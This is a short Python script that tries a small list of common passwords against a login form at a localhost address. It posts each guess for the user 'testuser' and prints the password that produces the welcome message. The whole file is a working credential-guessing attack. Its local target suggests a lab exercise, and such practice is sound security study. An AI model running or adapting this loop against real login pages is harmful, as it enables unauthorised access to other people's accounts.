import requests

url = "http://127.0.0.1:5000/login"

password = ["123456" ,"passsword" ,"admin123"]

for pw in password:
    response = requests.post(url ,data={"username":"testuser","password":pw})
    if "Welcome testuser!" in response.text:
        print(f"[SUCCESS]Password is {pw}")